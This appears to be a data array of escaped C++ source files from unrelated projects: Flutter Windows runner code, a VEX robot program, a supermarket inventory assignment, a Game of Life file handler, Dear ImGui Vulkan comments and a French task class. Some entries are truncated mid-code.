\u0427\u0442\u043e\u0431\u044b \u0441\u043d\u043e\u0432\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u044c \u044d\u0442\u043e\u0442 \u043f\u0440\u043e\u0435\u043a\u0442 \u043f\u043e\u0437\u0436\u0435, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u0424\u0430\u0439\u043b\" > \"\u041e\u0442\u043a\u0440\u044b\u0442\u044c\" > \"\u041f\u0440\u043e\u0435\u043a\u0442\" \u0438 \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 SLN-\u0444\u0430\u0439\u043b.\n",
    "/*----------------------------------------------------------------------------*/\n/*                                                                            */\n/*    Module:       main.cpp                                                  */\n/*    Author:       z                                                         */\n/*    Created:      2024/3/8 14:21:20                                         */\n/*    Description:  V5 project                                                */\n/*                                                                            */\n/*----------------------------------------------------------------------------*/\n// #include \"vex.h\"\n\n// using namespace vex;\n#include \"motor.hpp\"\n// A global instance of vex::brain used for printing to the V5 brain screen\nvex::brain       Brain;\n\n// define your global instances of motors and other devices here\n//\u5b66\u4e60\u4e00\u4e0b\u56de\u8c03\u51fd\u6570\uff0c\u53ef\u4ee5\u7b80\u5316\u4ee3\u7801\n\nint main()\n {\n    float distance5=300; //\u534a\u4e2a\u683c\u5b50\u7684\u7f16\u7801\u503c\n    inertial1.calibrate();\n    waitUntil(!inertial1.isCalibrating());\n    inertial1.resetRotation();\n    Brain.Screen.printAt( 10, 50, \"Hello V5\" );\n    planed_route();\n    //time1.clear();\n    // while(1)\n    // {\n    // spin_direction(-90);\n    // Brain.Screen.clearScreen();\n    // Brain.Screen.print(time1.time());\n    // if(time1.time()>3000)\n    // {\n    //   all_stop();\n    //   break;\n    // }\n    // }\n    // while (1)\n    // {\n    //   motor1_left.spin(directionType::rev,10,rpm);\n    //   //this_thread::sleep_for(20);\n    //   motor1_left.spin(directionType::rev,15,rpm);\n    //   //this_thread::sleep_for(20);\n    //   motor1_left.spin(directionType::rev,25,rpm);\n    //   //this_thread::sleep_for(20);\n    //   motor1_left.spin(directionType::rev,35,rpm);\n    //   //this_thread::sleep_for(20);\n    //   motor1_left.spin(directionType::rev,45,rpm);\n    //   //this_thread::sleep_for(20);\n    //   motor1_left.spin(directionType::rev,55,rpm);\n    //   //this_thread::sleep_for(20);\n    //   motor1_left.spin(directionType::rev,65,rpm);\n    //   //this_thread::sleep_for(20);\n    //   motor1_left.spin(directionType::rev,75,rpm);\n    //   //this_thread::sleep_for(20);\n    //   motor1_left.spin(directionType::rev,85,rpm);\n    //   //this_thread::sleep_for(20);\n      \n    // }\n    \n   \n   }\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"empty\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#ifndef __PROGTEST__\n#include <cstring>\n#include <cstdlib>\n#include <cstdio>\n#include <cassert>\n#include <iostream>\n#include <iomanip>\n#include <string>\n#include <vector>\n#include <map>\n#include <list>\n#include <set>\n#include <queue>\n#include <stack>\n#include <deque>\n#include <algorithm>\n#include <unordered_map>\n#include <unordered_set>\n#include <memory>\nusing namespace std;\n#endif /* __PROGTEST__ */\n\nclass CDate\n{\npublic:\n    tm storedDate = {0};\n\n    static bool validDate(int y, int m, int d) {\n        struct tm start = {0};\n\n        start.tm_mday = d;\n        start.tm_mon = m;\n        start.tm_year = y;\n\n        time_t rawtime = mktime(&start) - timezone;\n\n        if (rawtime == -1 || y < 100 || y > 130 || d != start.tm_mday || m != start.tm_mon || y != start.tm_year) {\n            return false;\n        }\n        else {\n            return true;\n        }\n    }\n\npublic:\n    CDate(int y, int m, int d) {\n        m--;\n        y -= 1900;\n\n        storedDate.tm_mday = d;\n        storedDate.tm_mon = m;\n        storedDate.tm_year = y;\n    }\n\n    bool operator== (CDate & rhs) {\n        time_t rawtime0 = mktime(&storedDate) - timezone;\n        time_t rawtime1 = mktime(&(rhs.storedDate)) - timezone;\n\n        return rawtime0 == rawtime1;\n    }\n\n    bool operator!= (CDate & rhs) {\n        return !(operator==(rhs));\n    }\n\n    bool operator< (const CDate & rhs) const {\n        if (storedDate.tm_year < rhs.storedDate.tm_year) {\n            return true;\n        }\n        else if ((storedDate.tm_year == rhs.storedDate.tm_year) && (storedDate.tm_mon < rhs.storedDate.tm_mon)) {\n            return true;\n        }\n        else if (((storedDate.tm_year == rhs.storedDate.tm_year) && (storedDate.tm_mon == rhs.storedDate.tm_mon)) && (storedDate.tm_mday < rhs.storedDate.tm_mday)) {\n            return true;\n        }\n        return false;\n    }\n\n    bool operator> (CDate & rhs) {\n        time_t rawtime0 = mktime(&storedDate) - timezone;\n        time_t rawtime1 = mktime(&rhs.storedDate) - timezone;\n\n        return rawtime0 > rawtime1;\n    }\n};\n\nclass CSupermarket\n{\npublic:\n    CSupermarket & store( string name, CDate date, int count ) {\n        auto pos = db.find(name); //try to find item if its already stored\n\n        if (pos == db.end()) { //new item name, add it\n            vector<pair<CDate, int>> temp; //initialize vector of pairs of ExpDates and amount for new product\n            temp.emplace_back(pair<CDate, int>(date, count));//push first pair\n\n            db.insert(pair<string,vector<pair<CDate,int>>>(name, temp));//store first product\n        }\n        else { //item exists, just add amount\n            auto vecPos = lower_bound(db[name].begin(), db[name].end(), pair<CDate, int>(date, count), [](pair<CDate, int> lhs, pair<CDate, int> rhs) {\n                return rhs.first > lhs.first; //find where it is stored\n            });\n\n            pos->second.insert(vecPos, pair<CDate, int>(date, count)); //add new instance of amount and expDate\n        }\n        return *this;\n    }\n\n    void sell(list<pair<string, int>> & ls) {\n        string product;\n        auto listIt = ls.begin();\n        long unsigned int idx = 0;\n\n        while (listIt != ls.end()) {\n            int counter = 0;\n            bool match = true;\n            auto pos = db.find(listIt->first); //find product by exact name\n//=====================for  product in list find appropriate key in storage===================\n\n            if (pos == db.end()) { //if item not found by exact name\n                for (auto j : db) { //iterate through storage again to possibly find with one typo\n                    if (errCmp(listIt->first, j.first) == 1) {//found a possibly appropriate name with typo\n                        product = j.first; //store key for finding it\n                        counter++; //add number of possible keys\n                    }\n                    if (counter > 1) { //ambigious name in list, has more than two matching keys, do not sell\n                        match = false;\n                        break;\n                    }\n                }\n                if (counter == 0 || counter > 1) { //no match or ambigious match\n                    ++listIt; //do nothing to list, advance to sell further\n                    match = false;\n                    continue;\n                }\n            }\n            else { //item found by exact so simple store key how to find it\n                product = pos->first;\n            }\n//========= now sell appropriate amounts, delete sold stuff from map and list if necessary========\n            auto found = db.find(product);\n\n            while (idx < found->second.size() && match) {  //if match exists iterate through storage vector of this item\n                if (listIt->second >= found->second[idx].second) {//you have to sell more or same amount than you have\n                    listIt->second -= found->second[idx].second; //subtract sold amount from list\n                    found->second[idx].second = 0; // //you s",
    "#include \"ManipulandoArquivo.hpp\"\n\nManipulandoArquivo::ManipulandoArquivo(){}\n\nvoid ManipulandoArquivo::setInputArquivo(string input_arquivo){\n    this->input_arquivo = \"datasets/input.mps\";\n}\n\nvoid ManipulandoArquivo::setOutputArquivo(string output_arquivo){\n    this->output_arquivo = output_arquivo;\n}\n\nint **ManipulandoArquivo::Input(){\n\n    fstream arquivo;\n    arquivo.open(input_arquivo, ios::in);\n    if(!arquivo)\n    {\n        cout << \"Arquivo de entrada nao pode ser aberto ou n\u00e3o encontrado\"<< endl;\n        exit(0);\n    }\n\n    arquivo>>tamanho;\n    if(tamanho < 5)\n    {\n        cout << \"Arquivo n\u00e3o atende os requisitos\"<< endl;\n        arquivo.close();\n        exit(0);\n    }\n    arquivo.ignore(); // para ignorar o \\n\n\n    int **tabuleiro =criarTabuleiro();\n    int contagem = 0;\n    for(int i = 0; i< tamanho; i++)\n    {\n        string linha;\n        getline(arquivo,linha);\n        for(int j = 0; j<tamanho; j++)\n        {\n            tabuleiro[i][j] = linha[j] - '0'; // coonverver o char para int\n\n            if(linha[j]=='1')\n            {\n                contagem ++;\n            }\n        }\n        cout<<endl;\n    }\n\n    if(contagem >= (tamanho*tamanho*(1/3.0)))\n    {\n        cout << \"A quantidade de vivo tem que ser no maximo 1/3 da quantidade de elementos \"<<tamanho*tamanho<<\"\\n\"<< endl;\n        arquivo.close();\n        exit(0);\n    }\n\n    arquivo.close();\n\n    return tabuleiro;\n}\n\nvoid ManipulandoArquivo::Output(int **tabuleiro){\n    ofstream arquivo(output_arquivo, ios::app);\n    if(!arquivo)\n    {\n        cout << \"Arquivo de saida nao pode ser aberto ou n\u00e3o encontrado\"<< endl;\n        exit(0);\n    }\n\n    for(int i = 0; i < tamanho; i++)\n    {\n        for(int j = 0; j< tamanho; j++)\n        {\n            arquivo<<tabuleiro[i][j];\n        }\n        arquivo<<endl;\n    }\n    arquivo <<\"--------------------------\\n\";\n    arquivo.close();\n}\n\nint ManipulandoArquivo::getTamanho() const{\n    return tamanho;\n}\n\nvoid ManipulandoArquivo::setTamanho(int tamanho){\n    this->tamanho = tamanho;\n}\n\nint ** ManipulandoArquivo::criarTabuleiro(){\n    int **tabuleiro = (int **)malloc(sizeof(int *)*tamanho);\n    for(int i=0; i<tamanho; i++)\n    {\n        tabuleiro[i]=(int *)malloc(sizeof(int *)*tamanho);\n    }\n    return tabuleiro;\n}",
    "// dear imgui: Renderer Backend for Vulkan\n// This needs to be used along with a Platform Backend (e.g. GLFW, SDL, Win32, custom..)\n\n// Implemented features:\n//  [!] Renderer: User texture binding. Use 'VkDescriptorSet' as ImTextureID. Read the FAQ about ImTextureID! See https://github.com/ocornut/imgui/pull/914 for discussions.\n//  [X] Renderer: Large meshes support (64k+ vertices) with 16-bit indices.\n\n// Important: on 32-bit systems, user texture binding is only supported if your imconfig file has '#define ImTextureID ImU64'.\n// This is because we need ImTextureID to carry a 64-bit value and by default ImTextureID is defined as void*.\n// To build this on 32-bit systems and support texture changes:\n// - [Solution 1] IDE/msbuild: in \"Properties/C++/Preprocessor Definitions\" add 'ImTextureID=ImU64' (this is what we do in our .vcxproj files)\n// - [Solution 2] IDE/msbuild: in \"Properties/C++/Preprocessor Definitions\" add 'IMGUI_USER_CONFIG=\"my_imgui_config.h\"' and inside 'my_imgui_config.h' add '#define ImTextureID ImU64' and as many other options as you like.\n// - [Solution 3] IDE/msbuild: edit imconfig.h and add '#define ImTextureID ImU64' (prefer solution 2 to create your own config file!)\n// - [Solution 4] command-line: add '/D ImTextureID=ImU64' to your cl.exe command-line (this is what we do in our batch files)\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.\n// Read online: https://github.com/ocornut/imgui/tree/master/docs\n\n// The aim of imgui_impl_vulkan.h/.cpp is to be usable in your engine without any modification.\n// IF YOU FEEL YOU NEED TO MAKE ANY CHANGE TO THIS CODE, please share them and your feedback at https://github.com/ocornut/imgui/\n\n// Important note to the reader who wish to integrate imgui_impl_vulkan.cpp/.h in their own engine/app.\n// - Common ImGui_ImplVulkan_XXX functions and structures are used to interface with imgui_impl_vulkan.cpp/.h.\n//   You will use those if you want to use this rendering backend in your engine/app.\n// - Helper ImGui_ImplVulkanH_XXX functions and structures are only used by this example (main.cpp) and by\n//   the backend itself (imgui_impl_vulkan.cpp), but should PROBABLY NOT be used by your own engine/app code.\n// Read comments in imgui_impl_vulkan.h.\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2023-07-04: Vulkan: Added optional support for VK_KHR_dynamic_rendering. User needs to set init_info->UseDynamicRendering = true and init_info->ColorAttachmentFormat.\n//  2023-01-02: Vulkan: Fixed sampler passed to ImGui_ImplVulkan_AddTexture() not being honored + removed a bunch of duplicate code.\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2022-10-04: Vulkan: Added experimental ImGui_ImplVulkan_RemoveTexture() for api symetry. (#914, #5738).\n//  2022-01-20: Vulkan: Added support for ImTextureID as VkDescriptorSet. User need to call ImGui_ImplVulkan_AddTexture(). Building for 32-bit targets requires '#define ImTextureID ImU64'. (#914).\n//  2021-10-15: Vulkan: Call vkCmdSetScissor() at the end of render a full-viewport to reduce likehood of issues with people using VK_DYNAMIC_STATE_SCISSOR in their app without calling vkCmdSetScissor() explicitly every frame.\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-03-22: Vulkan: Fix mapped memory validation error when buffer sizes are not multiple of VkPhysicalDeviceLimits::nonCoherentAtomSize.\n//  2021-02-18: Vulkan: Change blending equation to preserve alpha in output buffer.\n//  2021-01-27: Vulkan: Added support for custom function load and IMGUI_IMPL_VULKAN_NO_PROTOTYPES by using ImGui_ImplVulkan_LoadFunctions().\n//  2020-11-11: Vulkan: Added support for specifying which subpass to reference during VkPipeline creation.\n//  2020-09-07: Vulkan: Added VkPipeline parameter to ImGui_ImplVulkan_RenderDrawData (default to one passed to ImGui_ImplVulkan_Init).\n//  2020-05-04: Vulkan: Fixed crash if initial frame has no vertices.\n//  2020-04-26: Vulkan: Fixed edge case where render callbacks wouldn't be called if the ImDrawData didn't have vertices.\n//  2019-08-01: Vulkan: Added support for specifying multisample count. Set ImGui_ImplVulkan_InitInfo::MSAASamples to one of the VkSampleCountFlagBits values to use, default is non-multisampled as before.\n//  2019-05-29: Vulkan: Added support for large mesh (64K+ vertices), enable ImGuiBackendFlags_RendererHasVtxOffset flag.\n//  2019-04-30: Vulkan: Added support for special ImDrawCallback_ResetRenderState callback to reset render state.\n//  2019-04-04: *BREAKING CHANGE*: Vulkan:",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"tache.h\"\n#include<iostream>\nusing namespace std;\n// constructeur\n/**\n * @brief taches::taches le constructeur par d\u00e9faut de la classe \"tache\".\n */\ntache::tache()\n{\n\n}\n/**\n * @brief taches::taches constructeur de la classe \"taches\" est utilis\u00e9 pour cr\u00e9er une instance de la classe en sp\u00e9cifiant l'\u00e9v\u00e9nement associ\u00e9 \u00e0 la t\u00e2che et la date \u00e0 laquelle cette t\u00e2che est planifi\u00e9e.\n * @param [in] e Une cha\u00eene de caract\u00e8res (string) qui repr\u00e9sente l'\u00e9v\u00e9nement ou la description de la t\u00e2che.\n * @param [in] d Un objet de la classe \"Date\" qui repr\u00e9sente la date \u00e0 laquelle la t\u00e2che est planifi\u00e9e.\n */\ntache::tache(const string &e,const string &d)\n{\n    this->setevenement(e);\n    this->setdateT(d);\n\n}\n// destructeur\n/**\n * @brief taches::~taches le destructeur par d\u00e9faut de la classe \"tache\".\n */\ntache::~tache()\n{\n\n}\n// accesseurs\n/**\n * @brief taches::getevenement permet de r\u00e9cup\u00e9rer la valeur de l'attribut \"evenement\" de l'objet \"tache\".La fonction est d\u00e9finie comme constante (const), ce qui signifie qu'elle ne modifie pas l'objet \"tache\" et peut \u00eatre utilis\u00e9e pour obtenir la valeur de l'\u00e9v\u00e9nement ou de la description de la t\u00e2che sans la modifier.\n * @return une cha\u00eene de caract\u00e8res (string) qui repr\u00e9sente l'\u00e9v\u00e9nement ou la description de la t\u00e2che associ\u00e9e \u00e0 cet objet \"taches\".\n */\nstring tache::getevenement() const\n{\n    return this->evenement;\n}\n/**\n * @brief taches::getdateT permet de r\u00e9cup\u00e9rer l'objet \"dateT\", qui contient les informations sur la date, telles que le jour, le mois et l'ann\u00e9e de la t\u00e2che. Cette fonction est utile pour obtenir la date de la t\u00e2che \u00e0 partir de l'objet \"taches\" sans la modifier.\n * @return date de la t\u00e2che sous forme d'un objet \"Date\".\n */\nstring tache::getdateT()const\n{\n    return this->dateT;\n}\n// mutateurs\n/**\n * @brief taches::setevenement permet de d\u00e9finir la valeur de l'attribut \"evenement\" de l'objet \"taches\" avec la valeur fournie en argument.\n * @param [in] e repr\u00e9sente la nouvelle valeur de l'\u00e9v\u00e9nement ou de la description que vous souhaitez attribuer \u00e0 la t\u00e2che.\n */\nvoid tache::setevenement(const string &e)\n{\n    this->evenement=e;\n}\n/**\n * @brief taches::setdateT permet de d\u00e9finir la date associ\u00e9e \u00e0 la t\u00e2che en utilisant un objet de la classe \"Date\" pass\u00e9 en argument.\n * @param [in] d repr\u00e9sente l'objet de la classe \"Date\" que vous souhaitez associer \u00e0 la t\u00e2che en tant que nouvelle date de la t\u00e2che.\n */\nvoid tache::setdateT( const string &d)\n{\n    this->dateT=d;\n}\n// fonction amie\n/**\n * @brief operator << permet d'afficher une instance de la classe \"taches\" sous forme de cha\u00eene de caract\u00e8res format\u00e9e.\n * @param [in/out] os est un flux de sortie dans lequel nous souhaitons \u00e9crire les informations de l'objet \"taches\" \"T\".\n * @param [in] T est une r\u00e9f\u00e9rence constante \u00e0 un objet de la classe \"tache\". Cet objet de la classe \"tache\" repr\u00e9sente la t\u00e2che que nous souhaitons afficher \u00e0 l'aide de cet op\u00e9rateur de flux de sortie.\n * @return le flux de sortie \"os\" avec les informations de la t\u00e2che format\u00e9es comme vous l'avez d\u00e9fini dans la fonction.\n */\nostream & operator<<(ostream &os ,const tache &T)\n{\n    os<<\"@todo \"<<T.getevenement()<<\" @date \"<<T.getdateT();\n    return os;\n}\n/**\n * @brief tache::operator == permet de comparer deux objets de cette classe pour d\u00e9terminer s'ils sont \u00e9gaux en fonction de certains crit\u00e8res.\n * @param [in] T repr\u00e9sente une autre instance de la classe tache avec laquelle nous souhaitons comparer l'objet actuel pour d\u00e9terminer s'ils sont \u00e9gaux.\n * @return soit true soit false (faux), en fonction du r\u00e9sultat de la comparaison entre l'objet actuel de la classe tache pour lequel la fonction est appel\u00e9e et l'objet T de la classe tache pass\u00e9 en param\u00e8tre.\n */\nbool tache::operator==(const tache &T) const\n{\n    if(this->getevenement()==T.getevenement())\n        if(this->getdateT()==T.getdateT())\n            return true;\n    return false;\n}\n\n\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
